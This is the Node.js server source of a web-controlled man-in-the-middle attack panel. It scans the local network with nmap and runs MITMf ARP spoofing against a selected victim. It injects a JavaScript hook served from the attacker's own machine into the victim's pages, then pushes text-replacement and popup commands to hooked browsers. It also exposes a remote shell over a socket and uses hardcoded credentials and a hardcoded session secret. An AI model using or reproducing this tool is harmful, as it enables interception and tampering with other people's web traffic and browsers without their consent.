//var http = require("http");
var express = require('express');
var session = require('express-session');
var app = express();
var http = require('http').Server(app);
var terminal = require("web-terminal");
var url = require('url');
var fs = require('fs');
var io = require('socket.io')(http);
var url = require('url') ;
var bodyParser = require('body-parser');
var Convert = require('ansi-to-html');
var convert = new Convert();
var sys   = require('sys'),
    util  = require('util'),
    spawn = require('child_process').spawn;

/*
Virtual terminal Configuration:
->Spawns a terminal and listens for
->input on coming from the client side
*/

function openTerminal(arg,options){

    sh = spawn(arg,options);

    sh.stdout.on('data', function(data) {
        console.log(data.toString());
        listener.sockets.emit('terminal',{"text":convert.toHtml(data.toString())});
        scannedClients();
    });

    sh.stderr.on('data', function (data) {
        listener.sockets.emit("terminal", {"text":data.toString()});
    });

    sh.stdin.on('end', function() {
        console.log('process ended');
    });

}

/*
Web server configuration:
->Configuration of the files and
->user management of the server
->server is accessible from port 5001
*/
app.use(express.static(__dirname + '/public'));
app.use(session({secret: 'dIcKbuTT'}));
app.use(bodyParser.urlencoded({ extended: false }))

app.get('/', function(req, res){

    sess = req.session;

    if(sess.userid){
      res.sendFile(__dirname +'/index.html');
    }else{
        res.redirect('/login.html');
    }

});
http.listen(5001);
var listener = io.listen(http);

app.post('/login.html', function(req, res) {

    if(req.body.username == "pnsmn" && req.body.password == "pnsmn"){
        sess = req.session;
        sess.userid=req.body.username;
        res.redirect('/');
    }else{
        res.redirect('/login.html');
    }

});

app.post('/termEmbed.html', function(req, res) {

    if(req.body.username == "pnsmn" && req.body.password == "pnsmn"){
        sess = req.session;
        sess.userid=req.body.username;
        res.redirect('/termEmbed.html');
    }else{
        res.redirect('/login.html');
    }

});

/*
XML file parsing:
->Parses the xml file generated
->by nmap in order to display
->clients on the network
*/
var scannedClients = function(baseName, queryName) {
    var XMLPath = "public/output.xml";
    var rawJSON = loadXMLDoc(XMLPath);
    function loadXMLDoc(filePath) {
        var fs = require('fs');
        var xml2js = require('xml2js');
        var json;
        try {
            var fileData = fs.readFileSync(filePath, 'ascii');

            var parser = new xml2js.Parser();
            parser.parseString(fileData.substring(0, fileData.length), function (err, result) {
            json = JSON.stringify(result.nmaprun.host);
            listener.sockets.emit("nmap", json);
        });
        return json;
    } catch (ex) {console.log(ex)}
 }
};



var ip = require("ip");
console.log(ip.mask(ip.address(), ip.fromPrefixLen(24)));

/*
Listening to sockets and emitting data
*/
listener.sockets.on('connection', function(socket){

    var tmstp = socket.handshake.time;
    var ref = socket.handshake.headers.referer;
    var os = require('os');

    socket.on('client_connected',function(ip){
        socket.broadcast.emit('display_client',{'time':tmstp,'ref':ref,'os':os.hostname(),'ip':ip.ip,'id':socket.id});
        console.log('Got connection from: '+ip.ip);
    });


    socket.on('disconnect', function() {
      console.log('Got disconnect!');
      socket.broadcast.emit('hide_client',{'id':socket.id});
    });

    socket.on('scan_network',function(){
        var gateway = ip.mask(ip.address(), ip.fromPrefixLen(24))+"/24";
        console.log(gateway);
        var options = ['-oX','public/output.xml','-sn',gateway];
        openTerminal('nmap',options);
    });

    socket.on('message', function(data){
        sh.stdin.write(data+"\n");
    });

    socket.on('mitmf_client', function(data){
        sh.kill();
        process.chdir('/root/MITMf');
        var gateway = ip.mask(ip.address(), ip.fromPrefixLen(24)).slice(0, -1)+"1";
        console.log(gateway)
        var scriptPath = 'http://'+ip.address()+':5001/hook/pnsmn.js';
        var options = ['mitmf.py','-i','wlan0','--spoof','--arp','--target',data.ip,'--gateway',gateway,'--inject','--js-url',scriptPath];
        openTerminal("python",options);
    });

    socket.on('uiReplaceText',function(data){
        socket.broadcast.emit('replaceText',{'original':data.org,'replacement':data.rpl});
    });

    socket.on('uiDisplayPopup',function(data){
        socket.broadcast.emit('displayPopup',{'link':data.link});
    });

});